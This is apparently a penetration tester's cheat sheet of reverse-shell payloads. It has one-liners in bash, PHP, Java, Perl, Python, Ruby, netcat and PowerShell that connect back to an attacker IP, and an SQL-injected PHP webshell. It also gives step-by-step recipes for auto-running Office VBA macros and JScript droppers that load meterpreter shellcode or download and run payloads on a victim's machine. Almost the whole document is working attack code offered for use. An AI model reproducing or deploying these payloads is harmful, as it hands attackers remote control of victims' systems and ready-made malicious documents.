If victim is Linux, always run `python3 -c 'import pty; pty.spawn("/bin/bash")'` for interactive shell

## Bash reverse shell
`/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1`

## PHP reverse shell
`php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`

If this does not work, you can try replacing &3 with consecutive file descriptors (idk what this mean)

## Java reverse shell
If the target machine uses Java, try the following simple example:

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.1/1337;
cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Perl reverse shell
```perl
perl -e 'use Socket;$i="10.10.17.1";$p=1337;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");};'
```

## Python reverse shell
```python
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.17.1",1337));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

## Ruby reverse shell
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.17.1","1337");
while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
```

or

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.17.1",1337).to_i;
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Netcat reverse shell
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f`

## Powershell reverse shell
`cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .`, `nano Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress <kali ip> -Port <port>` to the bottom of the file. Then, run a python http server on your current folder and `iex (New-Object Net.WebClient).DownloadString("http://<kali ip>:<http server port>/Invoke-PowerShellTcp.ps1")`. This method is best because it can show error messages like permission denied.

or

[encode.py](/docs/appendix/encode-py)

or

```powershell
$sm=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).GetStream();
[byte[]]$bt=0..255|%{0};
while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
$sm.Write($st,0,$st.Length)}
```

## SQL & PHP reverse shell
`select "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE "<php DOCUMENT_ROOT>/webshell.php"` then u can access the webshell by going `http://<url>/webshell.php?c=whoami`

## VBA reverse shell

User has to press 'Enable Content'

### pure bytes in VBA
<details>
1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f vbapplication`
2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
3. put this in your office document (make sure its saved as a Word 97-2003 document)
```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    <paste output of 1 here>

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
</details>

However, this version (above) contains encoded meterpreter shell so might get detected by AV. Also, if the victim closes Word, we lose our shell. Version below fixes these:

### .ps1 reverse shell
<details>
1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
2. Save this file as `run.ps1` in the root folder of where u host your python http server
```
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
        
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
            uint dwCreationFlags, IntPtr lpThreadId);
            
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32
<output from 1 here>

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
3. In Kali, run `python3 -m http.server <port of your choice>`
4. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
5. put this in your VBA
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://<kali ip>:<http port>/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
</details>

## JScript reverse shell

### Saves to disk
<details>
1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f exe -o met.exe`
2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
3. `python3 -m http.server <port of your choice>`
4. On victim, save this as <filename>.js and run it:
```
var url = "http://<kali ip>:<http port>/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```
</details>

### Does not save to disk
<details>
1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
2. I saved DotNetToJscript-master on the kali, copy it over, then run the .sln file. 
3. Navigate to TestClass.cs (on the right), then use this to replace the `public class TestClass` part:
```
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    public TestClass()
    {
        <paste the output from 1>

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```
4. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
5. Click Build -> Build Solution
6. Navigate to the `DotNetToJScript/bin/Release` folder and copy `DotNetToJscript.exe` and `NDesk.Options.dll` and then also go to `ExampleAssembly/bin/Release` folder and copy `ExampleAssembly.dll` into the same folder
7. In that folder, run `DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js`
8. Double-click demo.js
</details>


Credit: [Invicti](https://www.invicti.com/learn/reverse-shell)